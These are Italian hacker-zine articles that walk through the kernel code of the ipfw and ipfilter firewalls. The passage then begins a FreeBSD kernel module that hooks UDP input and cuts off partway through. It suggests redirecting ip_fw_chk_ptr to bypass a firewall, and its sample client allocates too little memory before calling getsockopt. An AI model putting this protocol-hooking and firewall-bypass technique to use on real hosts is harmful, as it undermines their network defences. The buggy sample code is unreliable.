+1.1 ip_fw_init()
+1.2 ip_fw_chk()
+1.3 ip_fw_ctl()
+
+2.0 Introduzione al supporto kernel di ipfilter
+2.1 Attach e Detach del supporto
+2.2 Memorizzazione delle regole
+2.3 Azioni del firewall
+2.4 Note sulla compatibilita'
+
+3.0 Conclusioni
+
+- - - - - - - -
+
+0.0 Premessa
+
+In questo articolo descrivero' due firewall che un buon admin di sicuro 
+conosce...pero' lo faro' da un punto di vista del codice ..
+Se mi fossi messo a commentare riga per riga probabilmente sarebbe venuta
+fuori una cosa abbastanza pallosa, per me che scrivo e per voi che leggete,
+quindi ho cercato di essere sintetico mettendo in evidenza le parti piu'
+importanti del codice e che vi permettono di svolgere uno studio piu'
+approfondito ... per eventuali domande sul codice di questo articolo o su
+codice non riportato vi ricordo che potete contattarmi...
+
+
+1.0 Introduzione al supporto kernel di ipfw 
+
+Ipfw e'un firewall implementato all'interno del kernel e che puo' essere 
+utilizzato pure come modulo caricabile in memoria, se guardiamo i sorgenti 
+troviamo infatti:
+
+struct moduledata_t ipfwmod = {
+	"ipfw"
+	ipfw_modevent,
+	0
+};
+
+che e' la struttura adottata per definire un modulo in cui particolare
+importanza ha la funzione di gestione ipfw_modevent che si occupera' di
+gestire cosa deve succedere quando il modulo viene caricato e scaricato
+dalla memoria...
+
+Se questa e' pero' la definizione di un modulo occorre ancora una cosa,
+ovvero dichiararlo tramite la macro DECLARE_MODULE()
+
+DECLARE_MODULE(ipfw, ipfwmod, SI_SUB_PSEUDO, SI_ORDER_ANY);
+
+A questo punto il kernel conosce la sua esistenza, la funzione che lo
+gestisce e sa che tale supporto deve essere trattato come uno pseudo
+device (SI_SUB_PSEUDO).
+
+Analizziamo ora la funzione di gestione del supporto:
+
+static int
+ipfw_modevent(module_t mod, int type, void *unused)
+{
+	int s;
+
+	switch(type) {
+	case MOD_LOAD:
+		s = splnet();
+
+		old_chk_ptr = ip_fw_chk_ptr;
+		old_ctl_ptr = ip_fw_ctl_ptr;
+
+		ip_fw_init();
+		splx(s);
+		return 0;
+	case MOD_UNLOAD:
+		s = splnet();
+
+		ip_fw_chk_ptr = old_chk_ptr;
+		ip_fw_ctl_ptr = old_ctl_ptr;
+
+		while (LIST_FIRST(&ip_fw_chain) != NULL) {
+			struct ip_fw_chain *fcp = LIST_FIRST(&ip_fw_chain);
+			LIST_REMOVE(LIST_FIRST(&ip_fw_chain), chain);
+			free(fcp->rule, M_IPFW);
+			free(fcp, M_IPFW);
+		}
+
+		splx(s);
+		return 0;
+	default:
+		break;
+	}
+	return 0;
+}
+
+I due casi (MOD_LOAD e MOD_UNLOAD) sono chiaramete seguiti dalle istruzioni
+che devono essere eseguite quando rispettivamente tale funzione viene chiamata
+con type settato in modo da caricare o scaricare il modulo.
+
+- MOD_LOAD:   in questo caso si provvede a bloccare la ricezione con la funzione
+	      splnet() quanto basta per salvare i puntatori a ip_fw_chk_ptr e
+	      ip_fw_ctl_ptr e chiamare ip_fw_init() per poi rendere la priorita'
+	      precedente attraverso la splx().
+
+	      ip_fw_chk_ptr punta alla funzione che si occupa di analizzare un
+	      pacchetto e decide se questo dovra' essere scartato, dirottato o
+	      accettato in base alle regole che come vedremo dopo sono inserite
+	      in una lista.
+
+	      ip_fw_ctl_ptr si occupa invece di analizzare le opzioni di ipfw
+	      (IP_FW_GET, IP_FW_FLUSH, IP_FW_ZERO, IP_FW_ADD, IP_FW_DEL che 
+	      corrispondono a list/show, flush, zero, add, delete nel comando
+	      ipfw che chiamate da shell)
+
+	      Queste due funzioni vengono salvate in questi due puntatori:
+	    
+	   	 static ip_fw_chk_t *old_chk_ptr;
+	  	 static ip_fw_ctl_t *old_ctl_ptr;
+
+	      ip_fw_chk_t e ip_fw_ctl_t ci indicano come dovranno essere le
+	      funzioni a cui old_chk_ptr e old_ctl_ptr puntano:
+	
+	      [ip_fw.h]
+
+	      typedef int ip_fw_chk_t __P((struct ip **, int, struct ifnet *,
+	      		u_int16_t *, struct mbuf **, struct ip_fw_chain **, 
+			struct sockaddr_in **));
+	      typedef int ip_fw_ctl_t __P((struct sockopt *));
+
+- MOD_UNLOAD: blocca la ricezione, ripristina le due vecchie funzioni e
+	      pulisce la lista delle regole per poi ridare la priorita' con
+	      la splx().
+
+
+E' il momento di conoscere com'e' questa lista delle regole...
+
+Dobbiamo partire da una struttura definita in ip_fw.h:
+
+struct ip_fw_chain {
+	LIST_ENTRY(ip_fw_chain) chain;
+	struct ip_fw	*rule;
+};
+
+-> LIST_ENTRY(ip_fw_chain) chain;
+
+Se avete letto l'articolo sul divert che ho scritto ricorderete che le
+strutture di linkaggio si trovano in sys/queue.h
+
+LIST_ENTRY() e' sempre una macro che si riferisce alla lista ma che non 
+avevo analizzato nell'articolo del divert in quanto non ci avevamo sbattuto
+il muso contro se non indirettamente quando avevo riportato la struttura inpcb.
+
+#define LIST_ENTRY(type)
+struct {
+	struct type *le_next;  /* next element */
+	struct type **le_prev; /* address of previous next element */
+}
+
+Sintetizzando si tratta semplicemente della definizione di un nuovo elemento 
+della lista (chain);
+
+
+-> struct ip_fw	*rule;
+
+ip_fw e' una struttura definita in ip_fw.h e' un po' articolata ma sono
+costretto a riportarla se vogliamo capire qualcosa:
+
+
+/*
+ * Format of an IP firewall descriptor
+ *
+ * fw_src, fw_dst, fw_smsk, fw_dmsk are always stored in network byte order.
+ * fw_flg and fw_n*p are stored in host byte order (of course).
+ * Port numbers are stored in HOST byte order.
+ * Warning: setsockopt() will fail if sizeof(struct ip_fw) > MLEN (108)
+ */
+
+struct ip_fw {
+    u_int64_t fw_pcnt,fw_bcnt;		/* Packet and byte counters */
+    struct in_addr fw_src, fw_dst;	/* Source and destination IP addr */
+    struct in_addr fw_smsk, fw_dmsk;	/* Mask for src and dest IP addr */
+    u_short fw_number;			/* Rule number */
+    u_int fw_flg;			/* Flags word */
+#define IP_FW_MAX_PORTS	10		/* A reasonable maximum */
+	union {
+	u_short fw_pts[IP_FW_MAX_PORTS];	/* Array of port numbers to match */
+#define IP_FW_ICMPTYPES_MAX	128
+#define IP_FW_ICMPTYPES_DIM	(IP_FW_ICMPTYPES_MAX / (sizeof(unsigned) * 8))
+	unsigned fw_icmptypes[IP_FW_ICMPTYPES_DIM]; /* ICMP types bitmap */
+	} fw_uar;
+    u_char fw_ipopt,fw_ipnopt;		/* IP options set/unset */
+    u_char fw_tcpf,fw_tcpnf;		/* TCP flags set/unset */
+    long timestamp;			/* timestamp (tv_sec) of last match */
+    union ip_fw_if fw_in_if, fw_out_if;	/* Incoming and outgoing interfaces */
+    union {
+	u_short fu_divert_port;		/* Divert/tee port (options IPDIVERT) */
+	u_short fu_pipe_nr;		/* pipe number (option DUMMYNET) */
+	u_short fu_skipto_rule;		/* SKIPTO command rule number */
+	u_short fu_reject_code;		/* REJECT response code */
+	struct sockaddr_in fu_fwd_ip;
+    } fw_un;
+    u_char fw_prot;			/* IP protocol */
+    u_char fw_nports;			/* N'of src ports and # of dst ports */
+					/* in ports array (dst ports follow */
+					/* src ports; max of 10 ports in all; */
+					/* count of 0 means match all ports) */
+    void *pipe_ptr;                    /* Pipe ptr in case of dummynet pipe */
+    void *next_rule_ptr ;              /* next rule in case of match */
+    uid_t fw_uid;			/* uid to match */
+    gid_t fw_gid;			/* gid to match */
+};
+
+Quando date una nuova regola con il comando ipfw ogni opzione di cui e'
+composta finisce in una struttura di questo tipo, il cmd ipfw a cui possiamo
+riferirci se vogliamo con il termine client, si occupera' di gestire la riga
+di comando e credetemi (o se non lo fate guardate semplicemente la funzione
+add() del client) processare una di queste righe richiede molta attenzione
+nel mettere i valori nella struttura nel modo giusto ed e' la parte piu' 
+complessa e pallosa del client come del resto in tutti i supporti...
+Molte di queste variabili sono molto intuitive per chi conosce il firewall 
+ipfw, altre sono coperte all'utente e servono al supporto del kernel per
+fare in modo che la regola sia processata correttamente.
+
+
+Ritornando alla nostra struttura abbiamo visto che una regola della nostra 
+lista e' costituita da una struct che indica la regola successiva e 
+precedente e quindi la COLLOCAZIONE nella lista (la chain) e la REGOLA vera e 
+propria che e' una struttura di tipo ip_fw.
+
+Occorre ancora capire quale sia la testa della lista ...
+
+LIST_HEAD(ip_fw_head, ip_fw_chain) ip_fw_chain;
+
+Questa macro e' stata gia' spiegata nel mio articolo sul protocollo IP_DIVERT
+e rappresenta il primo elemento della lista.
+Per capire un po di piu' la lista che ipfw utilizza per le regole analizziamo
+una funzione di ricerca:
+
+static struct ip_fw_chain *
+lookup_next_rule(struct ip_fw_chain *me)
+{
+	struct ip_fw_chain *chain;
+	int rule = me->rule->fw_skipto_rule;
+
+	if ( (me->rule->fw_flg & IP_FW_COMMAND) == IP_FW_F_SKIPTO )
+	 for(chain = me->chain->le_next; chain ; chain = chain->chain.le_next)
+	  if(chain->rule->fw_number >= rule)
+	  	return chain;
+		
+	return me->chain->le_next;
+}	
+	
+Notate che il metodo di ricerca e' molto simile a quello delle strutture 
+inpcb riferite ad un protocollo ... si cerca mentre chain e' diverso da NULL 
+caricando gli elementi della lista per mezzo del puntatore le_next.
+Questa funzione e' un po' particolare perche' non cerca dall'inizio della
+lista ma da una regola data ...
+Un caso tipico che avviene nel kernel di scorrimento della catena di regole
+dalla testa si ha quando si fa il flush delle regole: questo comando richiede
+la cancellazione di TUTTE le regole e quindi e' chiaro che si partira' dalla
+prima... 
+
+static void
+flush_rule_ptrs()
+{
+	struct ip_fw_chain *fcp;
+
+	for (fcp = ip_fw_chain.lh_first; fcp; fcp = fcp->chain.le_next) {
+		fcp->rule->next_rule_ptr = NULL;
+	}
+}
+
+Ecco, qui vediamo che si parte da ip_fw_chain la nostra testa...
+
+Questa ricerca fatta da ipfw non utilizza le macro di queue.h ora scrivo
+la stessa cosa utilizzando le macro:
+
+/*
+ * mia flush_rule_ptrs()
+ * usa le macro di queue.h una programmazione piu' corretta che rispetta
+ * il kernel non e' proprio indispensabile ma voglio mostrarvi la 
+ * corrispondenza con le macro questo esempio viene seguito in altre parti
+ * del supporto...
+ */
+ 
+static void
+flush_rule_ptrs()
+{
+	struct ip_fw_chain *fcp;
+
+	for (fcp = LIST_FIRST(&ip_fw_chain); fcp; fcp = LIST_NEXT(fcp, chain))
+		fcp->rule->next_rule_ptr = NULL;
+	
+}	
+
+la voleta corta ?
+
+/*
+ * mia flush_rule_ptrs() corta
+ */
+
+static void
+flush_rule_ptrs()
+{
+	struct ip_fw_chain *fcp;
+
+	LIST_FOREACH(fcp, ip_fw_chain, chain)
+		fcp->rule->next_rule_ptr = NULL;
+}		
+
+Piu' breve di cosi' non si puo' cmq bella questa non trovate ? Sembra quasi che
+parli spiegandosi da sola :)
+
+Bene ... Vi ricordate la MOD_UNLOAD ... ora siete in grado da soli di capire
+quelle righe che ancora non avevo spiegato:
+
+while(LIST_FIRST(&ip_fw_chain) != NULL) {
+	struct ip_fw_chain *fcp = LIST_FIRST(&ip_fw_chain);
+	LIST_REMOVE(LIST_FIRST(&ip_fw_chain), chain);
+	free(fcp->rule, M_IPFW);
+	free(fcp, M_IPFW);
+}
+
+e che riguardano l'eliminazione della lista.
+
+
+1.1 ip_fw_init()
+
+ip_fw_init() se ricordavate veniva chiamata nel caricamento del modulo subito
+dopo aver salvato i due puntatori delle funzioni di gestione del supporto.
+
+-> ip_fw_chk_ptr = ip_fw_chk;
+-> ip_fw_ctl_ptr = ip_fw_ctl;
+
+E' chiaro che dopo aver salvato i vecchi puntatori di gestione, 
+bisogna fare in modo che quelli del supporto puntino alle nostre funzioni 
+ip_fw_chk() e ip_fw_ctl().
+
+-> LIST_INIT(&ip_fw_chain);
+
+Inoltre occorre inizializzare la lista delle regole di ipfw facendo puntare
+lh_first della nostra testa della lista (ip_fw_chain) a NULL; come avevo gia'
+spiegato nell'articolo sul DIVERT esiste una macro di queue.h chiamata 
+LIST_INIT()
+
+-> bzero(&default_rule, sizeof default_rule);
+-> default_rule.fw_prot = IPPROTO_IP;
+-> default_rule.fw_number = IPFW_DEFAULT_RULE;
+-> #ifdef IPFIREWALL_DEFAULT_TO_ACCEPT
+->	default_rule.fw_flg |= IP_FW_F_ACCEPT;
+-> #else
+-> 	default_rule.fw_flg |= IP_FW_F_DENY;
+-> #endif	
+-> .....
+
+Dobbiamo pure settare un comportamento di default del firewall in base a come
+l'admin ha compilato il kernel... 
+Se guardiamo le opzione di compilazione del kernel relative al fw scopriamo
+che IPFW_DEFAULT_TO_ACCEPT setta come regola generale il passaggio di
+qualsiasi cosa, se questa invece non viene specificata si considera come 
+regola di default che niente deve passare...
+Ovviamente trattandosi di una regola la struttura default_rule e' una
+struttura ip_fw.
+
+-> if(check_ipfw_struct(&default_rule) != 0 ||
+->    add_entry(&ip_fw_chain, &default_rule))
+->		panic("ip_fw_init");
+
+Come vi avevo gia' spiegato l'inserimento dei dati in una struttura ip_fw
+e' importantissimo e necessita di molti controlli il rischio di un kernel
+panic senza adeguati controlli sarebbe altissimo per non dire inevitabile,
+soprattutto qui che parliamo di un supporto che fa brodo nel kernel ...
+
+queste istruzioni che chiamano due funzioni verificano la struttura ip_fw
+e poi la inseriscono nella catena accessibile partendo come gia' visto in
+piu' occasioni da ip_fw_chain.
+
+Bene questa erano le parti fondamentali di questa funzione a questo punto non
+c'e' altro da fare che settare la variabile fw_verbose_limit in base
+all'opzione IPFIREWALL_VERBOSE che l'admin ha stabilito prima di compilare il
+kernel il resto sono semplici scritte su console...
+
+1.2 ip_fw_chk()
+
+Questa funzione restituisce zero se il pacchetto e' accettato/droppato...
+un numero di porta se il pacchetto deve essere dirottato.
+Come spiegato in precedenza e' questa la funzione che si occupa di analizzare
+i pacchetti ricevuti sottoforma di mbuf e in base alle regole nella lista
+di strutture ip_fw provvedera' ad accettare tale pacchetto o meno ...
+Ovviamente fa un minimo di verifica sulla validita' dell'mbuf ricevuto... e
+quindi dei vari layer di cui esso e' composto...
+E' una funzione abbastanza complessa perche' deve cercare l'uid della
+struttura ip_fw nelle liste delle connessioni dei protocolli tcp / udp e
+quindi deve accedere a tcbinfo e udbinfo, che sono le strutture inpcbinfo
+dei due protocolli, tramite la funzione in_pcblookup_hash() a cui avevo gia'
+accennato nell'articolo sul divert.
+Successivamente deve verificare come si deve comportare con quell'mbuf 
+estraendo l'ip layer ed il protocollo di trasporto ... controllando quindi
+dalla lista delle regole del firewall quale di queste sia applicabile a
+tale mbuf.
+Trovate le regole l'azione avviene in base al flag fw_flg della struttura
+ip_fw appropriata...
+Di particolare interesse e' il caso in cui il pacchetto non deve passare:
+se questo avviene si procede a vedere come e' settato fw_reject_code della
+struttura ip_fw se e' uguale a IP_FW_REJECT_RST si manda di ritorno
+un pacchetto TCP con la flag RST settata tramite la funzione tcp_respond(),
+altrimenti si manda un ICMP con codice unreachable usando la icmp_error().
+Si procede poi con la m_freem a liberarsi dell'mbuf.
+
+1.3 ip_fw_ctl()
+
+Questa funzione verifica il comportamento della regola settata con il cmd
+ipfw considerando questo il client vediamo la corrispondenza tra le regole
+di esso e quelle del kernel:
+
+		   client		supporto kernel
+		   
+		   add			IP_FW_ADD
+		   delete		IP_FW_DEL
+		   flush		IP_FW_FLUSH
+		   list			IP_FW_GET
+		   show			IP_FW_GET // si tratta di un alias
+		   zero			IP_FW_ZERO
+		   flush		IP_FW_FLUSH
+
+La funzione prende come parametro una struttura sock_opt e verifica tramite
+il campo sopt_name in quale caso di quelli riportati nella tabella ci troviamo
+eseguendo quindi il codice necessario.
+Una cosa che mi sembra importante e' il fatto che la regola di default ovvero
+quella che l'admin ha scelto quando ha compilato il kernel, NON puo' mai
+essere cancellata e quindi questa funzione dovra' informare tale cosa nel
+caso in cui viene richiesta non permettendola.
+
+Quando usiamo il cmd ipfw, questo utilizza una setsockopt() per passare uno
+dei valori riportati in tabella e la struttura ip_fw sulla quale si dovra' 
+agire (sempre che ce ne sia bisogno) e che dovra' essere ricercata nella
+lista delle regole tenute dal kernel...
+Nel caso il client richieda la visualizzazione di una regola la chiamata 
+sara' chiaramente getsockopt()
+
+infatti vediamo alcuni esempi:
+
+setsockopt(s, IPPROTO_IP, IP_FW_DEL,  &rule, sizeof rule);
+setsockopt(s, IPPROTO_IP, IP_FW_ADD,  &rule, sizeof rule);
+setsockopt(s, IPPROTO_IP, IP_FW_ZERO, NULL,  0);
+getsockopt(s, IPPROTO_IP, IP_FW_GET,  data,  &nbytes);
+
+Quindi quando utilizzate queste chiamate, dentro il kernel sara' la funzione
+a cui punta ip_fw_ctl_ptr (ovvero ip_fw_ctl) a ricevere la richiesta e a
+ricavarsi o a fornire la regola tramite le funzioni sooptcopyin() e
+sooptcopyout() : dico ricavarsi o fornire in quanto  nel caso per esempio di 
+IP_FW_ADD la regola passa dall'utente al kernel invece nel caso di IP_FW_GET 
+la regola passera' dal kernel all'utente...
+
+Per capire meglio come funzioni il passaggio delle regole ecco qui un semplice
+sorgente che ho scritto, il quale visualizza il numero di tutte le regole,
+potete completarlo visualizzando per ciascun numero tutta la regola ... cmq
+basta questo per comprendere l'algoritmo di fondo ... 
+
+---------- snip ----------
+
+/*
+ * Simple example of a "client" for ipfw kernel support
+ *
+ * This gives you all fw rule numbers...
+ *
+ * Piu' corto e semplice di cosi' non riuscivo a farlo
+ *
+ * pigpen [pigpen@s0ftpj.org]
+ * 
+ */
+
+#include <stdio.h>
+#include <err.h>
+#include <sysexits.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip_fw.h>
+
+#define N_RULE	100
+
+int main(void)
+{
+ struct ip_fw *rules, *rule;
+ int s, nbytes;
+
+ if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+ 	err(EX_UNAVAILABLE, "socket");
+ 
+ nbytes = sizeof(struct ip_fw) * N_RULE;
+ rules = (struct ip_fw *) malloc(N_RULE);
+ 
+ if(getsockopt(s, IPPROTO_IP, IP_FW_GET, rules, &nbytes) < 0)
+ 	err(EX_UNAVAILABLE, "getsockopt(IP_FW_GET)");
+
+ rule=&rules[0];
+ 
+ printf("Looking for ipfw rules...\n\n");
+ 
+ while(rule->fw_number) {
+ 	printf("-> %05u\n", rule->fw_number);
+	rule++;
+ }
+ 
+ close(s);
+ 
+ return 0;
+}
+
+---------- snip ----------
+
+Bene .... I'll be back in a few minutes ... DeadHour ... 
+Cazzo sono sulla ventina e mi sento gia' vecchio ... e ho pure gia' mal di
+schiena.. faccio un po' di pausa poi partiamo con ipfilter..
+
+
+2.0 Introduzione al supporto kernel di ipfilter 
+
+Ipfilter e' un supporto che utilizza uno pseudodevice (ipl), definito tramite 
+la seguente struttura:
+
+struct cfdriver iplcd = {
+	NULL, "ipl", NULL, NULL, DV_DULL, 0
+};
+
+la struttura cfdriver la trovate in sys/driver.h in questa definizione di ipl
+il device e' definito nel modo piu' generico possibile.
+
+Il device da solo pero' non serve occorre una struttura che raggruppi le
+funzioni che lo gestiscono proprio come i protocolli e i filesystems.
+Per i device esiste la struttura devsw (se vi ricordate l'articolo sul divert
+i protocolli hanno la protosw...)
+
+struct devsw iplsw = {
+	&iplcd,			// la nostra cfdriver di sopra
+	iplopen, iplclose, iplread, nowrite, iplioctl, noselect, nommap,
+	nostrat, nodump, nopsize, 0,
+	nostop
+};
+
+Questo nel caso di supporto nel kernel... se si preferisce l'utilizzo come
+lkm le strutture variano a secondo dell'os.... (nel caso mio che uso freebsd
+la struttura e' una cdevsw)
+Il codice supporta i seguenti os: FreeBSD, NetBSD, OpenBSD, Solaris, Irix,
+Linux, SunOS possiamo pure dire genericamente che ogni altro sistema bsd like 
+e' teoricamente compilabile con il supporto ipfilter....
+Se da una parte questo e' un bene, per me che sto qui a parlarne e' un po'
+complicato scrivere come si comporta il supporto per ogni os ... cerchero'
+quindi di spiegare le parti fondamentali e le funzioni in modo generico ma
+non troppo ... lasciando eventuali domande da parte vostra via mail...
+
+2.1 Attach e Detach del supporto 
+
+Come avevamo visto per ipfw esisteva una funzione di gestione del caricamento
+e dell'unload del modulo chiamata ipfw_modevent() sostanzialmente ipfilter fa
+lo stesso in mlf_ipc.c fornendo tale supporto per i vari os... e tirando su e
+giu' l'ipfilter con iplattach() e ipldetach() chiamate rispettivamente dentro
+la if_ipl_load() e if_ipl_unload().
+
+
+La funzione di ATTACH verifica se il supporto era gia' stato inizializzato,
+se questo e' falso procede all'inizializzazione sia del supporto in se, che
+di quello di logging se il kernel era stato compilato con IPFILTER_LOG
+settato; la funzione per quest'ultimo e' la ipflog_init() di ip_log.c .
+
+La funzione di DETACH si occupera' al contrario della precedente di tirar
+giu' l'intero supporto.
+
+La cosa interessante e' che ipfilter modifica la struttura protosw del
+layer di rete (IP) accedendo ad essa tramite la inetsw[].
+In particolare mi riferisco alla funzione ip_slowtimo() che viene sostituita
+nel caricamento con la ipfr_slowtimer() e nella funz. detach viene ripristinata
+tramite fr_saveslowtimo il quale viene fatto puntare a tale routine
+nell'attach prima di sostituirla, per chi volesse guardare la nuova
+ip_slowtimo, la trovate nel file ip_frag.c ricordo che potete scrivermi per
+maggiori informazioni =) avrete sicuramente una risposta anche se i miei 
+tempi sono piuttosto lunghi ... magari mettete come subject (LEGGIMI PIG:
+KERNEL) cosi' il mio filtro dello spool di posta (Smilzo:) riconosce il msg 
+dagli altri e la mia schedule() cerebrale da' una priorita' maggiore a tale 
+tipo di mail...
+
+2.2 Memorizzazione delle regole 
+
+Anche ipfilter gestisce le proprie regole attraverso una coda .. solo che
+non utilizza strutture proprie del kernel per linkarle ... questo
+probabilmente per mantenere una portabilita' maggiore del codice...
+
+[ip_fil.h]
+
+typedef	struct	frentry {
+	struct	frentry	*fr_next;
+	u_short	fr_group;	/* group to which this rule belongs */
+	u_short	fr_grhead;	/* group # which this rule starts */
+	struct	frentry	*fr_grp;
+	int	fr_ref;		/* reference count - for grouping */
+	void	*fr_ifa;
+	/*
+	 * These are only incremented when a packet  matches this rule and
+	 * it is the last match
+	 */
+	U_QUAD_T	fr_hits;
+	U_QUAD_T	fr_bytes;
+	/*
+	 * Fields after this may not change whilst in the kernel.
+	 */
+	struct	fr_ip	fr_ip;
+	struct	fr_ip	fr_mip;	/* mask structure */
+
+	u_char	fr_tcpfm;	/* tcp flags mask */
+	u_char	fr_tcpf;	/* tcp flags */
+
+	u_short	fr_icmpm;	/* data for ICMP packets (mask) */
+	u_short	fr_icmp;
+
+	u_char	fr_scmp;	/* data for port comparisons */
+	u_char	fr_dcmp;
+	u_short	fr_dport;
+	u_short	fr_sport;
+	u_short	fr_stop;	/* top port for <> and >< */
+	u_short	fr_dtop;	/* top port for <> and >< */
+	u_32_t	fr_flags;	/* per-rule flags && options (see below) */
+	int	fr_skip;	/* # of rules to skip */
+	int	(*fr_func) __P((int, ip_t *, fr_info_t *));	/* call this function */
+	char	fr_icode;	/* return ICMP code */
+	char	fr_ifname[IFNAMSIZ];
+	struct	frdest	fr_tif;	/* "to" interface */
+	struct	frdest	fr_dif;	/* duplicate packet interfaces */
+} frentry_t;
+
+Ecco qui come e' composto un elemento della coda... 
+Le funzioni di ricerca e di aggiunta o cancellazione di un elemento le 
+trovate in fil.c notate che la struttura contiene un puntatore alla prossima
+entrata (fr_next) che e' il corrispondente del membro le_next nella struttura
+ipfw se proprio vogliamo fare un paragone :)
+
+2.3 Azioni del firewall
+
+Abbiamo visto che ipfw usava la tcp_respond() per rispondere nel caso in cui 
+il pacchetto non dovesse passare. Ipfilter utilizza la sua funzione
+send_reset() la quale prepara un mbuf con la flag RST settata e lo 
+manda con la ip_output().
+Il concetto in pratica e' lo stesso solo che ipfilter preferisce utilizzare la
+propria funzione invece della tcp_respond() in quanto il passaggio di
+parametri a questa funzione avrebbe richiesto piu' lavoro... 
+Per quanto riguarda la generazione di un codice ICMP_UNREACH viene 
+utilizzata la ICMP_ERROR() che e' una macro di copertura della icmp_error()
+per standarizzare il passaggio di parametri ... in quanto Solaris ha la
+icmp_error() implementata in modo diverso ...
+
+#if SOLARIS
+#define ICMP_ERROR(b, ip, t, c, if, src)	icmp_error(ip)
+#else
+#define ICMP_ERROR(b, ip, t, c, if, src)	icmp_error(b, ip, if)
+#endif
+
+2.4 Note sulla compatibilita' 
+
+Cio' che mi lasciava perplesso e' come questo fw potesse funzionare su sistemi
+linux quando un po' di esperienza di programmazione nel kernel di linux mi aveva
+insegnato che la corrispondenza con la struttura mbuf di bsd era la sk_buff e
+da quel che ne so pure Solaris ha una sua struttura propria... in effetti la 
+risposta fu chiara quando mi scaricai tutto l'ipfilter :) semplicemente
+l'implementazione per questi due os era separata in file propri e la
+ip_compat.h uniformava il tutto introducendo nomi standard che poi venivano
+rispettati in tutte le implementazioni di ipfilter...
+
+#if SOLARIS
+typedef mblk_t mb_t;
+# ifdef linux
+typedef struct sk_buff mb_t;
+# else
+typedef struct mbuf mb_t;
+# endif
+#endif
+
+Quindi dove si e' potuto si e' mantenuto gli stessi file sorgente per vari
+os... funzioni come la send_reset() pero' erano troppo specifiche per essere
+compilabili su os come linux e Solaris infatti in AZIONI DEL FIREWALL ho
+parlato di struttura mbuf gestita all'interno della funzione e prima ancora
+di struttura inetsw[] ... tutta questa compatibilita' non e' possibile 
+chiaramente in linux e  Solaris che hanno per es. la propria send_reset() 
+in ip_lfil.c e ip_sfil.c...
+
+Infatti la send_reset() di linux usa l'alloc_skb() poi per mezzo di puntatori 
+uno all'header ip e l'altro a quello tcp prepara la struttura e la manda con 
+la ip_forward() che corrisponde all'ip_output() di cui parlavo sopra.
+
+Sotto Solaris invece c'e' la allocb() che viene preparata sempre tramite
+puntatori e poi il pacchetto viene mandato con la ip_wput().
+
+
+3.0 Conclusioni
+
+Questo dovrebbe bastare per rendervi curiosi... ipfw vs ipfilter non voleva
+essere una provocazione :) almeno no da un punto di vista del codice di uno
+rispetto all'altro ... diciamo pero' che da una parte avete un fw ben
+implementato nel kernel e piu' leggibile, dall'altra invece uno piu' portabile 
+e con un codice apprezzabile per lo sforzo che i programmatori hanno dovuto 
+fare per renderlo utilizzabile su tutti questi os.... 
+
+a voi la scelta
+
+bau
+
+haphazard`79
+
+
+
+
+------------------------------------------------------------------------------
+----------------------[ Network kernel hacking on a BSD box ]----------------- 
+------------------------------------------------------------------------------
+
+
+Consumo: /
+Musica Ascoltata: Radiodue (rivoglio Planet Rock!!!)
+Cibo: pranzo
+
+
+Questo articolo e' dedicato a tutti coloro che scrivono per la mailing list
+di sikurezza.org ... scusatemi se non contribuisco ancora ... ma il tempo
+e' assassino e la tabella di routing del mio sistema nervoso e' spesso a 
+puttane =)
+
+
+Cosa mi tormentava gia' da un po' di tempo e' che non avevo visto ancora
+da nessuna parte qualcuno che avesse cercato di fare quello che kossak e
+lifeline avevano pubblicato in phrack... nell'art. Building into the Linux
+Network Layer...
+
+Questo sorgente che vi propongo dovrebbe rimediare sulla scrittura di un
+modulo kld di FreeBSD che acceda ad un qualsiasi protocollo ... Tenete bene
+a mente la versione per cui l'ho compilato in quanto sicuramente sui vecchi
+kernel non funge su quelli nuovi si ... ma ci potrebbere essere effetti
+collaterali su versioni diverse dalla mia ... legati alla udp_input()
+
+Makefile
+---------- snip ----------
+SRCS	= nethack.c
+KMOD	= nethack
+KO	= ${KMOD}.ko
+KLDMOD	= t
+
+.include <bsd.kmod.mk>
+---------- snip ----------
+
+
+Questo modulo sostituisce una funzione della struttura protosw di udp, 
+con una che fa le stesse cose....
+La cosa bella e' che dimostra che si puo' accedere alle strutture di
+linkaggio dei protocolli, si puo' modificare le strutture mbuf ricevute...
+questo vuol dire happy hackin via kld...
+
+Volete alcune idee di moduli da scrivere ?
+
+- Bypassare un firewall (niente accesso via inetsw[] qui ... ma facendo 
+   puntare a ip_fw_chk_ptr la nostra funzione sotto vi mostro come)
+- Implementare moduli come quelli presentati nel mio articolo su bfi7 
+  o cmq come quelli di kossak e lifeline riguardante linux e' ora possibile
+  
+Facendola corta potete scrivervi un protocollo quasi da zero ...
+
+
+kldload ./nethack.c
+
+nethack.c
+---------- snip ----------
+/*
+ * network kernel hackin' on a FreeBSD box.... 
+ *
+ * why not? 
+ *
+ * yeah it's possible ... this is an example ... you can change hack_input() 
+ * function as you wanna...
+ *
+ * We can change functions of a struct of inetsw[], we can change mbuf
+ * structures... we can access inpcb,inpcbinfo structures... we can change
+ * options of every layer in a connection...
+ * 
+ * idea & code by pigpen [deadhead@sikurezza.org, pigpen@s0ftpj.org]
+ *
+ */
+
+/*
+ * uname -a
+ *
+ * FreeBSD storpio.cameretta.pig 4.0-19990705-CURRENT FreeBSD 4.0-19990705-
+ * CURRENT #4 ..... i386
+ * 
+ */
+
+
+#include <sys/param.h>
+#include <sys/systm.h>
+#include <sys/malloc.h>
+#include <sys/mbuf.h>
+#include <sys/kernel.h>
+#include <sys/proc.h>
+#include <sys/socket.h>
+#include <sys/socketvar.h>
+#include <sys/sysctl.h>
+#include <sys/syslog.h>
+#include <sys/protosw.h>
+#include <net/if.h>
+#include <net/route.h>
+#include <netinet/in.h>
+#include <netinet/in_systm.h>
+#include <netinet/in_pcb.h>
+#include <netinet/ip.h>
+#include <netinet/ip_var.h>
+#include <netinet/ip_icmp.h>
+#include <netinet/udp.h>
+#include <netinet/udp_var.h>
+
+
+extern struct 	protosw 	inetsw[];
+extern struct 	udpstat 	udpstat;
+extern int  	log_in_vain;
+extern struct 	inpcbhead 	udb;
+extern struct 	sockaddr_in 	udp_in;
+
+static void 	(*old_udp_input)	__P((register struct mbuf *, int ));
+static void  	hack_input		__P((register struct mbuf *, int ));
+static int  	s_load	 		__P((struct module *, int, void *));
+
+static int
+s_load (struct module *module, int cmd, void *arg)
+{
+ int s;
+
+ switch(cmd) {
+	case MOD_LOAD:
+			printf("Module loaded");
+			s = splnet();
